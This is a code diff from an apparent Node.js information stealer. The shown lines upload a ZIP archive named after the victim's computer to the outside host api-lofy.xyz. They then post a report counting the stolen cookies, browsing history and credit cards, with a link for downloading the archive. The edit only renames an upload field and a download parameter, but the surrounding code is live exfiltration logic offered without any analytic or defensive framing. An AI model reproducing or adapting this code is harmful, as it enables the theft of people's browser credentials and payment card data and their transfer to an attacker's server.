@@ -351,7 +351,7 @@
     //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     const fom = new sm()
-    fom.append('file', fs.createReadStream(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`)))
+    fom.append('panther', fs.createReadStream(pa.join(process.env.TEMP, `Panther-${process.env.COMPUTERNAME}.zip`)))
 
     const up = await (await fe('https://api-lofy.xyz/upload', {
         'method': 'POST',
@@ -376,7 +376,7 @@
         .addField('🍪 **Cookie(s)**', `\`\`\`${co.pe.length}\`\`\``, true)
         .addField('📅 **History(s)**', `\`\`\`${co.pi.length}\`\`\``, true)
         .addField('💳 **Credit Card(s)**', `\`\`\`${co.po.length}\`\`\``, true)
-        .addField('🆙 **Dowlond**', `[Click Here](https://api-lofy.xyz/download?key=${up.key})`, true)
+        .addField('🆙 **Dowlond**', `[Click Here](https://api-lofy.xyz/download?code=${up.codigo})`, true)
         .setThumbnail('https://i.pinimg.com/564x/19/f8/2f/19f82f9bfe1f76ec8b8415097152f85a.jpg')
         .setTimestamp()
         .setFooter(process.env.COMPUTERNAME, 'https://i.pinimg.com/564x/1e/d1/9b/1ed19bba596c8d8b46dd3c6e3893d877.jpg')
